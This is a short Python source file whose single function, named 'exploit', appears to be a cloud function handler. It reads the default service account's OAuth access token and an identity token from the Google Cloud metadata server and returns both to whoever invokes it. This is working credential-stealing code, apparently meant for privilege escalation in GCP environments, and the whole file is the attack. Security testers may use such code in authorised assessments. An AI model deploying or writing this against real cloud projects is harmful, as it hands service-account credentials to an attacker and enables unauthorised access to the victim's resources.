import subprocess
import random
import io
import json
import string
import os
from urllib.request import Request, urlopen
from base64 import b64decode, b64encode

def exploit(request):
    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
    req.add_header('Metadata-Flavor', 'Google')
    content = urlopen(req).read()
    token = json.loads(content)
    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=32555940559.apps.googleusercontent.com')
    req.add_header('Metadata-Flavor', 'Google')
    content = urlopen(req).read()
    token["identity"] = content.decode('utf-8')
    return json.dumps(token)